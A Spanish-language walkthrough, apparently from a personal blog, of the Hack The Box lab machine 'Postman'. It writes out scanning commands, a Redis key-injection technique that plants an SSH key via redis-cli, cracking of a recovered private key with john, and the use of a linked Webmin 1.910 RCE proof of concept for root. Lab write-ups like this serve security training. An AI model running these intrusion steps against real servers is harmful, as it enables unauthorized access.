---
title: "Postman"
date: 2026-02-26T13:15:33+01:00
draft: false
categories: ["htb", "machines"]
tags: ["easy", "machine", "linux", "cpts"]
ShowToc: true
TocOpen: true
---

# Scan
Empezamos realizando un escaneo de nmap ``nmap -p- -sV -sC -T 5 --min-rate=5000 10.129.2.1 -oN scan``

![](images/Postman.png)Ahora vamos a empezar con una enumeración de directorios usando ``gobuster dir -u http://10.129.2.1 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50``
![](images/Postman-1.png)
En el puerto 10000 vemos un panel de webmin
![](images/Postman-9.png)
## Redis
Basándonos en este post https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis-cli#ssh
Nos conectamos a redis y después de enumerar intentamos subir una clave ssh para conectarnos.
```bash
#Configuramos el directorio de redis:
redis-cli -h 10.129.2.1
config set dir /var/lib/redis/.ssh
config get dir
#Ahora generamos y subimos la clave 
ssh-keygen -t rsa
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h 10.129.2.1 -x set ssh_key

```
![](images/Postman-2.png)
Para conectarnos por ssh usamos la clave id_rsa que generamos previamente ``ssh redis@10.129.2.1 -i id_rsa``
![](images/Postman-3.png)
## Privesc  - Redis User
Subimos linpeas a la maquina para escanearla en busca de vectores de ataque para escalar privilegios.
Este escaneo nos encuentra la siguiente id_rsa en ``/opt/id_rsa.bak``
![](images/Postman-4.png)
### Matt
Nos intentemos conectar con la id_rsa.bak para ello la metemos en un archivo y le damos permisos 600 pero nos pide contraseña.
![](images/Postman-5.png)
Entonces vamos a intentar romperla con john:
![](images/Postman-6.png)
Ahora tenemos el usuario matt su id_rsa y su contraseña(computer2008) volvemos a intentar conectarnos:
![](images/Postman-7.png)
Esto sigue sin dejarnos conectar.
Entonces probamos desde redis a movernos de usuario con su lo que resulta efectivo y ahora ya podemos leer la flag de user.
![](images/Postman-8.png)
### Root 
Ahora vamos a intentar conectarnos al panel de webmin con las credenciales de Matt y vemos el panel de webmin y su version 1.910:
![](images/Postman-10.png)
Buscando si hay algún exploit conocido para webmin 1.910 encontramos la siguiente POC https://github.com/NaveenNguyen/Webmin-1.910-Package-Updates-RCE y al ejecutarla adquirimos una shell como root
![](images/Postman-11.png)
Ahora realizamos el tratamiento de la tty y en /root encontramos la flag
![](images/Postman-12.png)